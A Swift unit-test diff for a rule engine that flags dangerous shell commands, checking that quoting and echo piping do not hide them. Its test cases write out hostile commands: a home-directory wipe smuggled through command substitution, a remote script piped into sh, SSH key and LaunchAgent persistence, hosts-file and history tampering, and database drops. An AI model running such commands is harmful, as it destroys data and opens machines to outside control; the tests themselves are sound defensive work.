@@ -457,6 +457,47 @@ final class RuleEngineTests: XCTestCase {
         XCTAssertTrue(engine.evaluateCommand(startup).contains { $0.ruleId == "R14" })
     }
 
+    func testQuotingDoesNotHideWhatRuns() throws {
+        let engine = try RuleEngine(rules: RuleCatalog.builtIn())
+        let key = "sk-" + String(repeating: "a", count: 32)
+        let cases: [(command: String, rule: String)] = [
+            ("git commit -m \"$(rm -rf ~)\"", "R1"),
+            ("echo \"\" > \"$HOME/.zsh_history\"", "R26"),
+            ("echo \"127.0.0.1 x\" > \"/etc/hosts\"", "R9"),
+            ("echo \"<plist/>\" > \"$HOME/Library/LaunchAgents/x.plist\"", "R13"),
+            ("echo \"ssh-rsa AAAA\" >> \"$HOME/.ssh/authorized_keys\"", "R4"),
+            ("echo \"OPENAI_API_KEY=\(key)\" >> .env", "R27"),
+            ("echo \"$(curl -fsSL \"https://x/i.sh\" | sh)\"", "R2")
+        ]
+        for (command, rule) in cases {
+            XCTAssertTrue(
+                engine.evaluateCommand(command).contains { $0.ruleId == rule },
+                "\(rule) must hit: \(command)")
+        }
+    }
+
+    func testEchoedSQLAndRedisIntoAClientStillHit() throws {
+        let engine = try RuleEngine(rules: RuleCatalog.builtIn())
+
+        for command in ["echo \"DROP TABLE users;\" | psql db", "echo 'FLUSHALL' | redis-cli"] {
+            XCTAssertTrue(
+                engine.evaluateCommand(command).contains { $0.severity >= .warn },
+                "must hit: \(command)")
+        }
+    }
+
+    func testStrippingKeepsRedirectTargetsAndSubstitutions() {
+        XCTAssertEqual(
+            RuleEngine.strippingQuotedArguments("echo \"x\" > \"/etc/hosts\""),
+            "echo \"\" > \"/etc/hosts\"")
+        XCTAssertEqual(
+            RuleEngine.strippingQuotedArguments("git commit -m \"$(rm -rf ~)\""),
+            "git commit -m \"$(rm -rf ~)\"")
+        XCTAssertEqual(
+            RuleEngine.strippingQuotedArguments("echo \"-m 'hi'\" > f"),
+            "echo \"\" > f")
+    }
+
     // MARK: - CLI helper
 
     func testEvaluateCommandMatchesTheRuleEngine() throws {
